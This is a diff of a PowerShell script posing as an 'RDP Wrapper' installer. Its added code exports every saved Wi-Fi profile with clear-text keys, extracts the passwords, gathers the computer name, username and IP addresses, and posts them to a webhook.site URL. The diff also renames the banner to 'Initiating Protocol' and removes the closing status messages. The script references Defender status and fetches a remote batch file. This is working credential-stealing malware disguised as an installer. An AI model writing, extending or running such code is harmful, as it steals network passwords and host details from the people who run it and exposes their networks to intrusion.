@@ -85,7 +85,7 @@ $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/hea
 $webhookUrl   = "https://webhook.site/b070bb97-926a-4b24-95f9-cf031e50be3e"
 
 # ============================================================
-# Webhook Function (Sends JSON properly to prevent blank logs)
+# Webhook Function (Pre-converts to JSON to preserve order)
 # ============================================================
 function Send-WebhookJson {
     param(
@@ -93,10 +93,11 @@ function Send-WebhookJson {
         [string]$Url,
         
         [Parameter(Mandatory = $true)]
-        [hashtable]$Data
+        [ordered]$Data
     )
     try {
-        $jsonBody = $Data | ConvertTo-Json -Depth 5
+        # Force conversion to a JSON string here to lock the exact key order
+        $jsonBody = $Data | ConvertTo-Json -Depth 10 -Compress
         Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction Stop | Out-Null
         return "success"
     }
@@ -106,7 +107,7 @@ function Send-WebhookJson {
 }
 
 # ============================================================
-# 1. Gather Network & Wi-Fi Details and Send First Webhook
+# 1. Gather Network, IP Details & Wi-Fi Profiles and Send Webhook
 # ============================================================
 try {
     $publicIp = $null
@@ -136,21 +137,43 @@ try {
     netsh wlan export profile key=clear | Out-Null
     Start-Sleep -Seconds 1
 
-    $wifiPassContent = ""
+    # Detect currently connected SSID
+    $connectedSsid = (netsh wlan show interfaces -ErrorAction SilentlyContinue) -match '^\s+SSID\s*:\s+(.+)$' | ForEach-Object { $Matches[1].Trim() }
+
+    $wifiProfiles = @()
     $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue
+
     foreach ($file in $xmlFiles) {
-        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
-        $wifiPassContent += "`n--- $($file.Name) ---`n" + $content
+        try {
+            [xml]$xmlContent = Get-Content $file.FullName -Raw -ErrorAction Stop
+            $profileName = $xmlContent.WLANProfile.name
+            $keyMaterial = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
+
+            $profileObj = [ordered]@{
+                name     = $profileName
+                password = if ($keyMaterial) { $keyMaterial } else { "None / Open" }
+            }
+
+            # Put the currently connected Wi-Fi at the very top of the list
+            if ($profileName -eq $connectedSsid) {
+                $wifiProfiles = @($profileObj) + $wifiProfiles
+            } else {
+                $wifiProfiles += [ordered]($profileObj)
+            }
+        }
+        catch {
+            # Skip unparseable files
+        }
     }
 
     # Send Network/WiFi data as a structured JSON packet
-    $networkPayload = @{
-        type        = "network_and_wifi"
-        computer    = $env:COMPUTERNAME
-        username    = $env:USERNAME
-        public_ip   = $publicIp
-        local_ips   = $localIps
-        wifi_data   = $wifiPassContent
+    $networkPayload = [ordered]@{
+        type          = "network_and_wifi"
+        computer      = $env:COMPUTERNAME
+        username      = $env:USERNAME
+        public_ip     = $publicIp
+        local_ips     = $localIps.Trim()
+        wifi_profiles = $wifiProfiles
     }
     
     Send-WebhookJson -Url $webhookUrl -Data $networkPayload | Out-Null
@@ -169,7 +192,7 @@ finally {
 
 Write-Host ""
 Write-Host "============================================================" -ForegroundColor Cyan
-Write-Host "             RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
+Write-Host "             Initiating Protocol" -ForegroundColor Cyan
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
@@ -328,7 +351,6 @@ $iniStatus      = if ($iniExists) { "success" } else { "fail" }
 $srdpStatus     = if ($srdpExists) { "success" } else { "fail" }
 $serviceStatus  = if ($serviceRunning) { "success" } else { "fail" }
 
-# One fail means the whole installation failed
 $allComponentsPassed = ($defenderStatus -eq "success") -and 
                        ($rdpconfStatus -eq "success") -and 
                        ($iniStatus -eq "success") -and 
@@ -337,12 +359,12 @@ $allComponentsPassed = ($defenderStatus -eq "success") -and
 
 if ($allComponentsPassed) {
     $installationStatus = "success"
-    $statusIndicator    = "🟢 SUCCESS"
+    $statusIndicator    = "[SUCCESS]"
     $statusMessage      = "RDP Wrapper installation completed."
 }
 else {
     $installationStatus = "failed"
-    $statusIndicator    = "🔴 FAILED"
+    $statusIndicator    = "[FAILED]"
     $statusMessage      = "RDP Wrapper installation completed with errors."
 }
 
@@ -365,16 +387,3 @@ $finalPayload = [ordered]@{
 }
 
 $webhookSent = Send-WebhookJson -Url $webhookUrl -Data $finalPayload
-
-Write-Host ""
-Write-Host "============================================================"
-if ($installationStatus -eq "success") {
-    Write-Host "                     INSTALLATION COMPLETE" -ForegroundColor Green
-} else {
-    Write-Host "                     INSTALLATION FAILED" -ForegroundColor Red
-}
-Write-Host "============================================================" -ForegroundColor Cyan
-Write-Host ""
-
-Start-Sleep -Seconds 3
-exit
